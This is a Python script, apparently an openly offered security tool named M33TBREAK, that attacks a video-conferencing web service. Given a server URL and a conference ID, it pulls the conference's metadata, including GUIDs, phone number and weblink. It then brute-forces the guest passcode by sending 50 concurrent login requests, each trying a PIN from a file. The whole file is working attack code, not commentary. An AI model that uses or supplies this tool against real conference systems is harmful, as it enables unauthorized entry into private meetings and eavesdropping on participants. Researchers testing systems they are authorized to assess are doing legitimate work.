#!/usr/bin/env python3

"""
------------------------------------------------------------------------------
	M33TBREAK - Septiembre 2018 - Yamila Levalle @ylevalle
------------------------------------------------------------------------------
"""

#%%%%%%%%%%% Libraries %%%%%%%%%%%#

import json
import requests
import sys
import aiohttp
import asyncio
import concurrent.futures
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#%%%%%%% Context Variables %%%%%%%#

version = 1.0

#%%%%%%% Functions %%%%%%%#

def banner():
	b = """
  __  __ _______________ ____  ____  _____    _    _  __
 |  \/  |___ /___ /_   _| __ )|  _ \| ____|  / \  | |/ /
 | |\/| | |_ \ |_ \ | | |  _ \| |_) |  _|   / _ \ | ' / 
 | |  | |___) |__) || | | |_) |  _ <| |___ / ___ \| . \ 
 |_|  |_|____/____/ |_| |____/|_| \_\_____/_/   \_\_|\_\ 
                                                        

usage: meetbreak.py <targeturl> <conferenceid>            

example: meetbreak.py https://meet.example.com 5001      
                                                         
"""
	print(b)

def parse_args():

	argnumber = len(sys.argv)
	arg1 = sys.argv[1]
	arg2 = sys.argv[2]
	return {'url':arg1,'conferenceid':arg2}
	
#%%%%%%% Test Passcode %%%%%%%#
	
async def do_req(urllogin, response, line, semaphore):	
	async with semaphore:
		async with aiohttp.ClientSession() as session:
			
			try:
				async with session.post(urllogin, json={"name":"test","passcode":str(line),"guid":response['conferenceGuid'],"sourceGuid":response['sourceGuid'],"conferenceId":response['conferenceId'],"webkitRTC":"true","mozRTC":"false","flash":"false","screenShare":"false","resolutionGuid":response['resolutionGuid']},verify_ssl=False) as query:
					data = await query.json()
					
					if (data['reason'] == "unsupportedBrowser" or data['response'] == "success"):
						print("[*] ======================================================= [*]")
						print("[!] Conference Passcode Guessed: "+ str(line))
						print("[*] ======================================================= [*]")
						main.guessed = 1	
						
			except Exception as e:
				pass
		
def main():

	banner()
	params = parse_args()
	
#%%%%%%% Inicialize Parameters %%%%%%%#

	urllogin = params.get('url') + "/guestLoginRequest.sf"
	url = params.get('url') + "/guestConference.sf"
	confid = params.get('conferenceid')	
	paramsjson = {'id':str(confid),'passcode':""}
	main.guessed = 0

#%%%%%%% Print Conference Information %%%%%%%#
	
	try:
		query = requests.post(url,json=paramsjson,verify=False)
		response = query.json()
			
	except Exception as e:
		print(e)
		pass

	if response['response'] == "success":
		print("[*] ======================================================= [*]")
		print("[!] Conference Call to Bruteforce:")
		print("[*] ID: "+str(response['conferenceId']))
		print("[*] Name: "+str(response['name']))
		print("[*] Video Address: "+str(response['videoAddress']))
		print("[*] Conference GUID: "+str(response['conferenceGuid']))
		print("[*] Source GUID: "+str(response['sourceGuid']))
		print("[*] Resolution GUID: "+str(response['resolutionGuid']))
		print("[*] Passcode: "+str(response['passcode']))
		print("[*] Phone Number: "+str(response['phoneNumber']))
		print("[*] Weblink: "+str(response['weblink']))
		print("[*] ======================================================= [*]")
			
	else:
		print ("[!] Error: Invalid Conference ID or the Conference does not have a Passcode")
		pass
		
#%%%%%%% Asyncio Loop to Bruteforce Passcodes from File %%%%%%%#
	
	if (response['response'] == "success" and response['passcode']):
		
		file = open('pins.txt')
		futures = []
		semaphore = asyncio.BoundedSemaphore(50)
	
		for line in file: 
			futures.append(do_req(urllogin, response, line, semaphore))
	
		loop = asyncio.get_event_loop()
		loop.run_until_complete(asyncio.wait(futures))
		loop.close()
		
		if (main.guessed == 0):
			print("[*] ======================================================= [*]")
			print("[!] Sorry, the Passcode of the Conference isn't in the file")
			print("[*] ======================================================= [*]")
							
main()

#%%%%%%%%%% The End %%%%%%%%%%#
